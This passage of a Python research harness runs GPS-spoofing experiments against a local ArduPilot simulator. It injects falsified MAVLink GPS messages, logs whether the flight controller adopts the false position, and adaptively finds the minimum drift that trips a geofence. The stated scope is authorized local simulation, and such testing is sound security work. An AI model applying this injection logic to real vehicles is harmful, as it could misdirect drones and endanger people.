    (bundle_dir / "README.md").write_text("\n".join(text) + "\n", encoding="utf-8")


def write_bundle(
    bundle_dir: Path,
    experiment: str,
    env: dict,
    injection_rows: list[dict],
    telemetry_rows: list[dict],
    verdict: dict,
) -> Path:
    write_csv(bundle_dir / "injection.csv", INJECTION_FIELDS, injection_rows)
    write_csv(bundle_dir / "telemetry.csv", TELEMETRY_FIELDS, telemetry_rows)
    env["completed_at_utc"] = utc_now()
    env["missing_required_files_before_write"] = validate_result_bundle(bundle_dir)
    (bundle_dir / "env.json").write_text(
        json.dumps(env, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (bundle_dir / "verdict.json").write_text(
        json.dumps(verdict, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    write_readme(bundle_dir, experiment, verdict, env)
    missing = validate_result_bundle(bundle_dir)
    if missing:
        verdict["verdict"] = "invalid"
        verdict["reason"] = f"missing required files: {missing}"
        (bundle_dir / "verdict.json").write_text(
            json.dumps(verdict, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )
    return bundle_dir


def base_env(config: RunnerConfig, experiment: str, route: str, connection: str) -> dict:
    return {
        "created_at_utc": utc_now(),
        "experiment": experiment,
        "scope": "authorized local ArduPilot SITL only",
        "route": route,
        "connection": connection,
        "home": config.home,
        "port": config.port,
        "udp_port": config.udp_port,
        "repo": repo_state(),
        "ardupilot": ardupilot_info(config.ardupilot_dir),
        "ports_before": listening_ports(),
        "attack_config": {
            "iterations": config.iterations,
            "interval": config.interval,
            "step_m": config.step_m,
            "bearing_deg": config.bearing_deg,
            "warmup_sec": config.warmup_sec,
            "gps_id": config.gps_id,
            "fix_type": config.fix_type,
            "satellites": config.satellites,
            "hacc": config.hacc,
            "vacc": config.vacc,
            "sacc": config.sacc,
            "max_speed": config.max_speed,
            "max_accel": config.max_accel,
            "max_drift_m": config.max_drift_m,
            "decision_hold_sec": config.decision_hold_sec,
            "adaptive_refine_steps": config.adaptive_refine_steps,
            "profile": config.profile,
            "mission": config.mission,
            "route": config.route,
            "objective": config.objective,
            "routes": config.routes,
            "stealth_budget": config.stealth_budget,
            "payload": config.payload,
        },
        "not_claimed": NOT_CLAIMED,
    }


def blocked_bundle(
    config: RunnerConfig, experiment: str, route: str, reason: str
) -> Path:
    bundle_dir = create_bundle(config, experiment)
    (bundle_dir / "sitl.log").write_text(f"blocked: {reason}\n", encoding="utf-8")
    (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
    (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
    env = base_env(config, experiment, route, "<not connected>")
    verdict = {
        "experiment": experiment,
        "claim_tested": route,
        "verdict": "blocked",
        "reason": reason,
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    return write_bundle(bundle_dir, experiment, env, [], [], verdict)


def run_position_injection(
    config: RunnerConfig,
    experiment: str,
    route: str,
    connection: str,
    profile: str,
    engine: str,
    injection_kind: str,
    claim: str,
    expect_positive: bool,
    use_mavproxy: bool = False,
) -> Path:
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, route, connection)
    processes: list[ManagedProcess] = []
    conn = None
    injection_rows: list[dict] = []
    telemetry_rows: list[dict] = []
    verdict = {
        "experiment": experiment,
        "claim_tested": claim,
        "verdict": "error",
        "reason": "experiment did not complete",
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    try:
        sitl, sitl_command = start_sitl(config, bundle_dir)
        processes.append(sitl)
        env["sitl_launch_command"] = sitl_command
        env["ports_after_sitl_start"] = listening_ports()

        if use_mavproxy:
            mavproxy, mavproxy_command, mavproxy_error = start_mavproxy(config, bundle_dir)
            env["mavproxy_command"] = mavproxy_command
            env["mavproxy_error"] = mavproxy_error
            if mavproxy_error:
                (bundle_dir / "params_before.txt").write_text(
                    "not captured: MAVProxy path blocked before MAVLink parameter snapshot\n",
                    encoding="utf-8",
                )
                (bundle_dir / "params_after.txt").write_text(
                    "not captured: MAVProxy path blocked before MAVLink parameter snapshot\n",
                    encoding="utf-8",
                )
                verdict["verdict"] = "blocked"
                verdict["reason"] = mavproxy_error
                return write_bundle(bundle_dir, experiment, env, [], [], verdict)
            if mavproxy is not None:
                processes.append(mavproxy)

        conn = connect_mavlink(connection)
        request_message_intervals(conn)
        env["target_system"] = conn.target_system
        env["target_component"] = conn.target_component
        env["params_before"] = snapshot_params(conn, bundle_dir / "params_before.txt")
        lat, lon, alt, _heading = parse_home(config.home)
        state = empty_state()
        start = time.time()
        telemetry_rows.extend(
            warmup_gps(conn, config, experiment, "warmup", lat, lon, alt, route, start, state)
        )
        samples = generate_sequence(lat, lon, alt, config, profile, engine, route)
        for sample in samples:
            injection_rows.append(injection_row(experiment, "injection", sample))
            if injection_kind == "global-position-int":
                send_gps_input(conn, baseline_sample(lat, lon, alt, route), config)
                send_global_position_int(conn, sample)
            elif injection_kind == "hil-gps":
                send_hil_gps(conn, sample, config)
            else:
                send_gps_input(conn, sample, config)
            telemetry_rows.extend(
                collect_telemetry(
                    conn,
                    experiment,
                    "injection",
                    sample.sample_index,
                    sample,
                    lat,
                    lon,
                    start,
                    max(config.interval, 0.15),
                    state,
                )
            )

        telemetry_rows.extend(
            collect_telemetry(
                conn,
                experiment,
                "settle",
                samples[-1].sample_index if samples else 0,
                samples[-1] if samples else None,
                lat,
                lon,
                start,
                2.0,
                state,
            )
        )
        env["params_after"] = snapshot_params(conn, bundle_dir / "params_after.txt")
        metrics = compute_reflection_metrics(telemetry_rows, injection_rows)
        verdict["metrics"] = metrics
        if expect_positive:
            passed, reason = positive_reflection_pass(metrics)
            verdict["verdict"] = "pass" if passed else "fail"
            verdict["reason"] = reason
        else:
            passed, reason = negative_control_pass(metrics)
            verdict["verdict"] = "pass" if passed else "fail"
            verdict["reason"] = reason
        return write_bundle(bundle_dir, experiment, env, injection_rows, telemetry_rows, verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        verdict["verdict"] = "error"
        verdict["reason"] = repr(exc)
        return write_bundle(bundle_dir, experiment, env, injection_rows, telemetry_rows, verdict)
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        for proc in reversed(processes):
            proc.stop()


def run_e0(config: RunnerConfig) -> Path:
    experiment = "E0_environment_lock"
    connection = f"tcp:127.0.0.1:{config.port}"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "fc-direct-env-lock", connection)
    processes: list[ManagedProcess] = []
    conn = None
    verdict = {
        "experiment": experiment,
        "claim_tested": "SITL environment lock",
        "verdict": "error",
        "reason": "environment lock did not complete",
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    try:
        sitl, sitl_command = start_sitl(config, bundle_dir)
        processes.append(sitl)
        env["sitl_launch_command"] = sitl_command
        env["ports_after_sitl_start"] = listening_ports()
        conn = connect_mavlink(connection)
        request_message_intervals(conn)
        env["target_system"] = conn.target_system
        env["target_component"] = conn.target_component
        env["params_before"] = snapshot_params(conn, bundle_dir / "params_before.txt")
        env["params_after"] = snapshot_params(conn, bundle_dir / "params_after.txt")
        write_csv(bundle_dir / "injection.csv", INJECTION_FIELDS, [])
        write_csv(bundle_dir / "telemetry.csv", TELEMETRY_FIELDS, [])
        required_env = [
            env["ardupilot"]["commit"],
            env["ardupilot"]["binary_sha256"],
            env["sitl_launch_command"],
            env["params_before"].get("GPS1_TYPE"),
        ]
        passed = all(v not in (None, "", "<error:") for v in required_env)
        verdict["verdict"] = "pass" if passed else "fail"
        verdict["reason"] = (
            "environment fields captured"
            if passed
            else "one or more environment fields are missing"
        )
        return write_bundle(bundle_dir, experiment, env, [], [], verdict)
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        verdict["verdict"] = "error"
        verdict["reason"] = repr(exc)
        return write_bundle(bundle_dir, experiment, env, [], [], verdict)
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        for proc in reversed(processes):
            proc.stop()


def run_e1(config: RunnerConfig) -> Path:
    return run_position_injection(
        config,
        experiment="E1_global_position_int_negative",
        route="fc-direct-with-baseline-gps-input-control",
        connection=f"tcp:127.0.0.1:{config.port}",
        profile="linear",
        engine="global-position-int",
        injection_kind="global-position-int",
        claim="GLOBAL_POSITION_INT does not contaminate FC/EKF navigation input",
        expect_positive=False,
    )


def run_e2(config: RunnerConfig) -> Path:
    if config.install_mavproxy:
        install_mavproxy(PROJECT_ROOT)
    if find_mavproxy(PROJECT_ROOT) is None and not config.install_mavproxy:
        return blocked_bundle(
            config,
            "E2_mavproxy_udp_gps_input_negative",
            "mavproxy-udp-gps-input",
            "mavproxy.py not found; rerun with --install-mavproxy to execute this control",
        )
    return run_position_injection(
        config,
        experiment="E2_mavproxy_udp_gps_input_negative",
        route="mavproxy-udp-gcs-style-path",
        connection=f"udpin:127.0.0.1:{config.udp_port}",
        profile="linear",
        engine="gps-input",
        injection_kind="gps-input",
        claim="MAVProxy UDP GCS-style path should not be mistaken for FC direct GPS_INPUT",
        expect_positive=False,
        use_mavproxy=True,
    )


def run_e3(config: RunnerConfig) -> Path:
    return run_position_injection(
        config,
        experiment="E3_fc_direct_gps_input_positive",
        route="fc-direct-gps-input",
        connection=f"tcp:127.0.0.1:{config.port}",
        profile="linear",
        engine="gps-input",
        injection_kind="gps-input",
        claim="GPS_INPUT direct-link reflection/input contamination",
        expect_positive=True,
    )


def run_e4(config: RunnerConfig) -> list[Path]:
    linear_path = run_position_injection(
        config,
        experiment="E4_linear_gps_input",
        route="fc-direct-gps-input",
        connection=f"tcp:127.0.0.1:{config.port}",
        profile="linear",
        engine="gps-input",
        injection_kind="gps-input",
        claim="linear GPS_INPUT profile metrics",
        expect_positive=True,
    )
    smooth_path = run_position_injection(
        config,
        experiment="E4_ekf_smooth_gps_input",
        route="fc-direct-gps-input",
        connection=f"tcp:127.0.0.1:{config.port}",
        profile="ekf-smooth",
        engine="gps-input",
        injection_kind="gps-input",
        claim="ekf-smooth GPS_INPUT profile metrics",
        expect_positive=True,
    )
    try:
        linear_verdict = json.loads((linear_path / "verdict.json").read_text(encoding="utf-8"))
        smooth_verdict = json.loads((smooth_path / "verdict.json").read_text(encoding="utf-8"))
        passed, reason = compare_smooth(
            linear_verdict.get("metrics", {}), smooth_verdict.get("metrics", {})
        )
        smooth_verdict["comparison_against_linear"] = {
            "linear_bundle": str(linear_path),
            "comparison_pass": passed,
            "comparison_reason": reason,
        }
        if smooth_verdict.get("verdict") == "pass" and not passed:
            smooth_verdict["verdict"] = "fail"
            smooth_verdict["reason"] = reason
        (smooth_path / "verdict.json").write_text(
            json.dumps(smooth_verdict, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
    except Exception:
        pass
    return [linear_path, smooth_path]


def run_e5(config: RunnerConfig) -> Path:
    return run_position_injection(
        config,
        experiment="E5_companion_post_access_bridge",
        route="local-companion-json-plan-to-trusted-mavlink-gps-input",
        connection=f"tcp:127.0.0.1:{config.port}",
        profile="ekf-smooth",
        engine="gps-input",
        injection_kind="gps-input",
        claim="post-access companion bridge model reproduces GPS_INPUT reflection",
        expect_positive=True,
    )


def configure_geofence(conn) -> dict[str, bool]:
    requested = {
        "FENCE_ENABLE": 1,
        "FENCE_TYPE": 3,
        "FENCE_ACTION": 1,
        "FENCE_RADIUS": 8,
        "FENCE_MARGIN": 1,
    }
    return {name: set_param(conn, name, value) for name, value in requested.items()}


def run_geofence_case(
    config: RunnerConfig,
    bundle_dir: Path,
    case_name: str,
    profile: str | None,
    append_log: bool,
) -> tuple[dict, list[dict], list[dict], dict]:
    connection = f"tcp:127.0.0.1:{config.port}"
    processes: list[ManagedProcess] = []
    conn = None
    injection_rows: list[dict] = []
    telemetry_rows: list[dict] = []
    env_case: dict = {"case": case_name, "connection": connection}
    try:
        sitl, sitl_command = start_sitl(config, bundle_dir, append_log=append_log)
        processes.append(sitl)
        env_case["sitl_launch_command"] = sitl_command
        conn = connect_mavlink(connection)
        request_message_intervals(conn)
        lat, lon, alt, _heading = parse_home(config.home)
        env_case["params_before"] = snapshot_params(
            conn, bundle_dir / f"params_before_{case_name}.txt"
        )
        env_case["geofence_set_results"] = configure_geofence(conn)
        state = empty_state()
        start = time.time()
        telemetry_rows.extend(
            warmup_gps(
                conn,
                config,
                "E6_geofence_mission_impact",
                f"{case_name}_warmup",
                lat,
                lon,
                alt,
                "fc-direct-gps-input-geofence",
                start,
                state,
            )
        )
        if profile is None:
            sample = baseline_sample(lat, lon, alt, "fc-direct-gps-input-geofence")
            end = time.time() + config.iterations * config.interval
            while time.time() < end:
                send_gps_input(conn, sample, config)
                telemetry_rows.extend(
                    collect_telemetry(
                        conn,
                        "E6_geofence_mission_impact",
                        case_name,
                        0,
                        sample,
                        lat,
                        lon,
                        start,
                        max(config.interval, 0.15),
                        state,
                    )
                )
        else:
            samples = generate_sequence(
                lat,
                lon,
                alt,
                config,
                profile,
                "gps-input",
                "fc-direct-gps-input-geofence",
            )
            for sample in samples:
                injection_rows.append(
                    injection_row("E6_geofence_mission_impact", case_name, sample)
                )
                send_gps_input(conn, sample, config)
                telemetry_rows.extend(
                    collect_telemetry(
                        conn,
                        "E6_geofence_mission_impact",
                        case_name,
                        sample.sample_index,
                        sample,
                        lat,
                        lon,
                        start,
                        max(config.interval, 0.15),
                        state,
                    )
                )
        telemetry_rows.extend(
            collect_telemetry(
                conn,
                "E6_geofence_mission_impact",
                f"{case_name}_settle",
                0,
                None,
                lat,
                lon,
                start,
                2.0,
                state,
            )
        )
        env_case["params_after"] = snapshot_params(
            conn, bundle_dir / f"params_after_{case_name}.txt"
        )
        metrics = compute_reflection_metrics(telemetry_rows, injection_rows)
        metrics["decision_changed"] = metrics["fence_breach_observed"]
        if metrics["decision_changed"]:
            decision_rows = [row for row in telemetry_rows if is_fence_breach_row(row)]
            if decision_rows:
                first = decision_rows[0]
                metrics["decision_change_time_s"] = as_float(first.get("elapsed_s"))
                metrics["drift_at_decision_m"] = as_float(
                    first.get("official_drift_m"),
                    as_float(first.get("target_drift_m")),
                )
        return env_case, injection_rows, telemetry_rows, metrics
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        for proc in reversed(processes):
            proc.stop()
        time.sleep(1.0)


def run_e6(config: RunnerConfig) -> Path:
    experiment = "E6_geofence_mission_impact"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "fc-direct-gps-input-geofence", f"tcp:127.0.0.1:{config.port}")
    all_injection_rows: list[dict] = []
    all_telemetry_rows: list[dict] = []
    verdict = {
        "experiment": experiment,
        "claim_tested": "minimal geofence mission-impact decision",
        "verdict": "error",
        "reason": "E6 did not complete",
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    try:
        cases = [
            ("baseline", None),
            ("linear", "linear"),
            ("ekf_smooth", "ekf-smooth"),
        ]
        case_metrics = {}
        case_envs = []
        for idx, (case_name, profile) in enumerate(cases):
            env_case, inj, telem, metrics = run_geofence_case(
                config, bundle_dir, case_name, profile, append_log=idx > 0
            )
            case_envs.append(env_case)
            case_metrics[case_name] = metrics
            all_injection_rows.extend(inj)
            all_telemetry_rows.extend(telem)
        env["cases"] = case_envs
        env["params_before"] = case_envs[0].get("params_before", {}) if case_envs else {}
        env["params_after"] = case_envs[-1].get("params_after", {}) if case_envs else {}
        (bundle_dir / "params_before.txt").write_text(
            json.dumps(env["params_before"], indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
        (bundle_dir / "params_after.txt").write_text(
            json.dumps(env["params_after"], indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
        baseline_changed = case_metrics.get("baseline", {}).get("decision_changed", False)
        linear_changed = case_metrics.get("linear", {}).get("decision_changed", False)
        smooth_changed = case_metrics.get("ekf_smooth", {}).get("decision_changed", False)
        verdict["metrics"] = case_metrics
        if (linear_changed or smooth_changed) and not baseline_changed:
            verdict["verdict"] = "pass"
            verdict["reason"] = "geofence decision changed under injected GPS_INPUT but not baseline"
        else:
            verdict["verdict"] = "fail"
            verdict["reason"] = (
                "official position may have changed, but reproducible geofence decision change was not observed"
            )
        return write_bundle(
            bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict
        )
    except Exception as exc:
        (bundle_dir / "params_before.txt").write_text("not captured\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text("not captured\n", encoding="utf-8")
        if not (bundle_dir / "sitl.log").exists():
            (bundle_dir / "sitl.log").write_text("", encoding="utf-8")
        verdict["verdict"] = "error"
        verdict["reason"] = repr(exc)
        return write_bundle(bundle_dir, experiment, env, all_injection_rows, all_telemetry_rows, verdict)


@dataclass
class AdaptiveMotionState:
    drift_m: float = 0.0
    speed_mps: float = 0.0
    sample_index: int = 0


def bounded_adaptive_sample(
    base_lat: float,
    base_lon: float,
    base_alt: float,
    config: RunnerConfig,
    state: AdaptiveMotionState,
    desired_drift_m: float,
    route: str,
    profile: str = "adaptive",
) -> InjectionSample:
    dt = max(config.interval, 1e-3)
    desired_delta = desired_drift_m - state.drift_m
    desired_speed = max(-config.max_speed, min(config.max_speed, desired_delta / dt))
    max_delta_speed = config.max_accel * dt
    if desired_speed > state.speed_mps:
        speed = min(desired_speed, state.speed_mps + max_delta_speed)
    else:
        speed = max(desired_speed, state.speed_mps - max_delta_speed)
    drift = state.drift_m + speed * dt
    if (desired_delta >= 0 and drift > desired_drift_m) or (desired_delta < 0 and drift < desired_drift_m):
        drift = desired_drift_m
        speed = (drift - state.drift_m) / dt
    accel = abs(speed - state.speed_mps) / dt
    bearing = math.radians(config.bearing_deg)
    north = drift * math.cos(bearing)
    east = drift * math.sin(bearing)
    lat, lon = offset_latlon_m(base_lat, base_lon, north, east)
    state.drift_m = drift
    state.speed_mps = speed
    state.sample_index += 1
    return InjectionSample(
        sample_index=state.sample_index,
        target_lat=lat,
        target_lon=lon,
        target_alt=base_alt,
        north_m=north,
        east_m=east,
        target_drift_m=haversine_m(base_lat, base_lon, lat, lon),
        vn=speed * math.cos(bearing),
        ve=speed * math.sin(bearing),
        vd=0.0,
        commanded_speed_mps=abs(speed),
        commanded_accel_mps2=accel,
        profile=profile,
        engine="gps-input",
        route=route,
    )


def latest_global_row(rows: list[dict]) -> dict | None:
    for row in reversed(rows):
        if row.get("message_type") == "GLOBAL_POSITION_INT":
            return row
    return None


def reflection_ok_for_row(row: dict | None) -> bool:
    if row is None:
        return False
    target_drift = as_float(row.get("target_drift_m"))
    official_drift = as_float(row.get("official_drift_m"))
    target_error = as_float(row.get("target_error_m"), default=9999.0)
    if target_drift <= 0:
        return False
    return (
        official_drift >= 0.50 * target_drift
        and target_error <= max(2.0, 0.35 * target_drift)
    )


def first_decision_event(
    rows: list[dict], experiment: str, case_name: str, event_type: str
) -> dict | None:
    for row in rows:
        if event_type == "fence_breach" and not is_fence_breach_row(row):
            continue
        if event_type == "mission_advance":
            if row.get("message_type") != "MISSION_CURRENT" or as_float(row.get("mission_seq")) <= 0:
                continue
        return {
            "timestamp": row.get("timestamp", utc_now()),
            "experiment": experiment,
            "case": case_name,
            "event_type": event_type,
            "elapsed_s": row.get("elapsed_s", ""),
            "sample_index": row.get("sample_index", ""),
            "target_drift_m": row.get("target_drift_m", ""),
            "official_drift_m": row.get("official_drift_m", ""),
            "mode": row.get("mode", ""),
            "mission_seq": row.get("mission_seq", ""),
            "fence_breach_status": row.get("fence_breach_status", ""),
            "status_text": row.get("status_text", ""),
            "evidence_message_type": row.get("message_type", ""),
        }
    return None


def controller_row(
    experiment: str,
    case_name: str,
    iteration: int,
    action: str,
    sample: InjectionSample,
    latest: dict | None,
    breach: bool,
    low: float,
    high: float,
) -> dict:
    return {
        "timestamp": utc_now(),
        "experiment": experiment,
        "case": case_name,
        "iteration": iteration,
        "action": action,
        "target_drift_m": sample.target_drift_m,
        "step_m": "",
        "target_error_m": as_float(latest.get("target_error_m")) if latest else "",
        "official_drift_m": as_float(latest.get("official_drift_m")) if latest else "",
        "reflection_ok": int(reflection_ok_for_row(latest)),
        "breach_observed": int(breach),
        "low_bound_m": low,
        "high_bound_m": high,
        "commanded_speed_mps": sample.commanded_speed_mps,
        "commanded_accel_mps2": sample.commanded_accel_mps2,
    }


def run_adaptive_geofence_case(
    config: RunnerConfig,
    bundle_dir: Path,
    append_log: bool,
) -> tuple[dict, list[dict], list[dict], list[dict], list[dict], dict]:
    experiment = "E8_adaptive_geofence"
    case_name = "adaptive"
    route = "fc-direct-gps-input-geofence-adaptive"
    connection = f"tcp:127.0.0.1:{config.port}"
    processes: list[ManagedProcess] = []
    conn = None
    injection_rows: list[dict] = []
    telemetry_rows: list[dict] = []
    controller_rows: list[dict] = []
    decision_rows: list[dict] = []
    env_case: dict = {"case": case_name, "connection": connection}
    try:
        sitl, sitl_command = start_sitl(config, bundle_dir, append_log=append_log)
        processes.append(sitl)
        env_case["sitl_launch_command"] = sitl_command
        conn = connect_mavlink(connection)
        request_message_intervals(conn)
        lat, lon, alt, _heading = parse_home(config.home)
        env_case["params_before"] = snapshot_params(conn, bundle_dir / "params_before_adaptive.txt")
        env_case["geofence_set_results"] = configure_geofence(conn)
        state = empty_state()
        start = time.time()
        telemetry_rows.extend(
            warmup_gps(conn, config, experiment, "adaptive_warmup", lat, lon, alt, route, start, state)
        )

        motion = AdaptiveMotionState()
        desired = 0.0
        step = 0.5
        low = 0.0
        high = 0.0
        breach_seen = False
        iteration = 0

        while desired < config.max_drift_m and iteration < 200:
            iteration += 1
            desired = min(config.max_drift_m, desired + step)
            sample = bounded_adaptive_sample(lat, lon, alt, config, motion, desired, route)
            injection_rows.append(injection_row(experiment, "adaptive_probe", sample))
            send_gps_input(conn, sample, config)
            chunk = collect_telemetry(
                conn,
                experiment,
                "adaptive_probe",
                sample.sample_index,
                sample,
                lat,
                lon,
                start,
                max(config.interval, 0.15),
                state,
            )
            telemetry_rows.extend(chunk)
            latest = latest_global_row(chunk) or latest_global_row(telemetry_rows)
            breach = any(is_fence_breach_row(row) for row in chunk)
            if breach:
                high = sample.target_drift_m
                breach_seen = True
                event = first_decision_event(chunk, experiment, case_name, "fence_breach")
                if event:
                    decision_rows.append(event)
                controller_rows.append(controller_row(experiment, case_name, iteration, "breach_found", sample, latest, True, low, high))
                break
            if reflection_ok_for_row(latest):
                low = sample.target_drift_m
                step = min(2.0, step * 1.25)
                action = "increase"
            else:
                step = max(0.25, step * 0.5)
                action = "slow_for_reflection"
            row = controller_row(experiment, case_name, iteration, action, sample, latest, False, low, high)
            row["step_m"] = step
            controller_rows.append(row)

        refine_start = iteration
        for refine_idx in range(config.adaptive_refine_steps):
            if not breach_seen:
                break
            iteration = refine_start + refine_idx + 1
            target = (low + high) / 2.0
            sample = bounded_adaptive_sample(lat, lon, alt, config, motion, target, route)
            injection_rows.append(injection_row(experiment, "adaptive_refine", sample))
            send_gps_input(conn, sample, config)
            chunk = collect_telemetry(
                conn,
                experiment,
                "adaptive_refine",
                sample.sample_index,
                sample,
                lat,
                lon,
                start,
                max(config.decision_hold_sec, config.interval),
                state,
            )
            telemetry_rows.extend(chunk)
            latest = latest_global_row(chunk) or latest_global_row(telemetry_rows)
            breach = any(is_fence_breach_row(row) for row in chunk)
            if breach:
                high = min(high, sample.target_drift_m)
                event = first_decision_event(chunk, experiment, case_name, "fence_breach")
                if event:
                    decision_rows.append(event)
                action = "refine_high"
            else:
                low = max(low, sample.target_drift_m)
                action = "refine_low"
            controller_rows.append(controller_row(experiment, case_name, iteration, action, sample, latest, breach, low, high))

        env_case["params_after"] = snapshot_params(conn, bundle_dir / "params_after_adaptive.txt")
        metrics = compute_reflection_metrics(telemetry_rows, injection_rows)
        metrics["decision_changed"] = metrics["fence_breach_observed"]
        metrics["minimum_breach_drift_m"] = high if breach_seen else 0.0
        metrics["last_non_breach_drift_m"] = low
        metrics["adaptive_iterations"] = iteration
        return env_case, injection_rows, telemetry_rows, controller_rows, decision_rows, metrics
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass
        for proc in reversed(processes):
            proc.stop()
        time.sleep(1.0)


def route_connection(route: str, config: RunnerConfig) -> tuple[str, bool, str]:
    if route == "mavproxy-udp":
        return f"udpin:127.0.0.1:{config.udp_port}", True, "mavproxy-udp-gcs-style-path"
    if route == "companion":
        return f"tcp:127.0.0.1:{config.port}", False, "local-companion-json-plan-to-trusted-mavlink-gps-input"
    return f"tcp:127.0.0.1:{config.port}", False, "fc-direct-gps-input"


def run_e7(config: RunnerConfig) -> Path:
    experiment = "E7_route_matrix"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "route-matrix", "<matrix>")
    (bundle_dir / "sitl.log").write_text("E7 launches per-cell child bundles.\n", encoding="utf-8")
    (bundle_dir / "params_before.txt").write_text("see child bundles\n", encoding="utf-8")
    (bundle_dir / "params_after.txt").write_text("see child bundles\n", encoding="utf-8")
    matrix_rows: list[dict] = []
    matrix_config = replace(config, iterations=8, warmup_sec=min(config.warmup_sec, 4.0), step_m=1.0)
    for route in ("fc-direct", "mavproxy-udp", "companion"):
        connection, use_mavproxy, route_label = route_connection(route, matrix_config)
        for message in ("global-position-int", "gps-input", "hil-gps"):
            child = run_position_injection(
                matrix_config,
                experiment=f"E7_{route}_{message}",
                route=route_label,
                connection=connection,
                profile="linear",
                engine=message,
                injection_kind=message,
                claim=f"route matrix: {route} {message}",
                expect_positive=True,
                use_mavproxy=use_mavproxy,
            )
            child_verdict = json.loads((child / "verdict.json").read_text(encoding="utf-8"))
            metrics = child_verdict.get("metrics", {})
            matrix_rows.append(
                {
                    "timestamp": utc_now(),
                    "route": route,
                    "message": message,
                    "connection": connection,
                    "verdict": child_verdict.get("verdict", "error"),
                    "reason": child_verdict.get("reason", ""),
                    "observed_count": metrics.get("observed_count", 0),
                    "reflection_rate": metrics.get("reflection_rate", 0.0),
                    "final_target_drift_m": metrics.get("final_target_drift_m", 0.0),
                    "final_official_drift_m": metrics.get("final_official_drift_m", 0.0),
                    "mean_target_error_m": metrics.get("mean_target_error_m", 0.0),
                    "bundle": str(child),
                }
            )
    write_csv(bundle_dir / "route_matrix.csv", ROUTE_MATRIX_FIELDS, matrix_rows)
    gps_success = [r for r in matrix_rows if r["message"] == "gps-input" and r["verdict"] == "pass"]
    verdict = {
        "experiment": experiment,
        "claim_tested": "route/message reflection matrix",
        "verdict": "pass" if gps_success else "fail",
        "reason": "route matrix captured; GPS_INPUT reflection is route-dependent" if gps_success else "no GPS_INPUT route reflected",
        "metrics": {
            "cells": len(matrix_rows),
            "gps_input_pass_cells": len(gps_success),
            "global_position_int_pass_cells": len([r for r in matrix_rows if r["message"] == "global-position-int" and r["verdict"] == "pass"]),
            "hil_gps_pass_cells": len([r for r in matrix_rows if r["message"] == "hil-gps" and r["verdict"] == "pass"]),
        },
        "not_claimed": NOT_CLAIMED,
    }
    (bundle_dir / "mission_summary.json").write_text(json.dumps(verdict, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return write_bundle(bundle_dir, experiment, env, [], [], verdict)


def run_e8(config: RunnerConfig) -> Path:
    experiment = "E8_adaptive_geofence"
    bundle_dir = create_bundle(config, experiment)
    env = base_env(config, experiment, "fc-direct-gps-input-adaptive-geofence", f"tcp:127.0.0.1:{config.port}")
    all_injection_rows: list[dict] = []
    all_telemetry_rows: list[dict] = []
    all_controller_rows: list[dict] = []
    all_decision_rows: list[dict] = []
    verdict = {
        "experiment": experiment,
        "claim_tested": "adaptive minimum-drift geofence deception",
        "verdict": "error",
        "reason": "E8 did not complete",
        "metrics": {},
        "not_claimed": NOT_CLAIMED,
    }
    try:
        linear_iterations = max(1, math.ceil(config.max_drift_m / max(config.step_m, 0.1)))
        e8_config = replace(config, iterations=linear_iterations)
        case_envs = []
        case_metrics = {}
        for idx, (case_name, profile) in enumerate((("baseline", None), ("linear", "linear"))):
            env_case, inj, telem, metrics = run_geofence_case(
                e8_config, bundle_dir, case_name, profile, append_log=idx > 0
            )
            case_envs.append(env_case)
            case_metrics[case_name] = metrics
            all_injection_rows.extend(inj)
            all_telemetry_rows.extend(telem)
            event = first_decision_event(telem, experiment, case_name, "fence_breach")
            if event:
                all_decision_rows.append(event)
        env_case, inj, telem, controller, decisions, metrics = run_adaptive_geofence_case(
            e8_config, bundle_dir, append_log=True
        )
        case_envs.append(env_case)
        case_metrics["adaptive"] = metrics
        all_injection_rows.extend(inj)
        all_telemetry_rows.extend(telem)
        all_controller_rows.extend(controller)
        all_decision_rows.extend(decisions)
        env["cases"] = case_envs
        env["params_before"] = case_envs[0].get("params_before", {}) if case_envs else {}
        env["params_after"] = case_envs[-1].get("params_after", {}) if case_envs else {}
        (bundle_dir / "params_before.txt").write_text(json.dumps(env["params_before"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        (bundle_dir / "params_after.txt").write_text(json.dumps(env["params_after"], indent=2, sort_keys=True) + "\n", encoding="utf-8")
        write_csv(bundle_dir / "controller.csv", CONTROLLER_FIELDS, all_controller_rows)
        write_csv(bundle_dir / "decision_events.csv", DECISION_EVENT_FIELDS, all_decision_rows)
        linear_final = case_metrics.get("linear", {}).get("final_target_drift_m", 0.0)
        adaptive_min = case_metrics.get("adaptive", {}).get("minimum_breach_drift_m", 0.0)
        baseline_changed = case_metrics.get("baseline", {}).get("decision_changed", False)
        adaptive_changed = case_metrics.get("adaptive", {}).get("decision_changed", False)
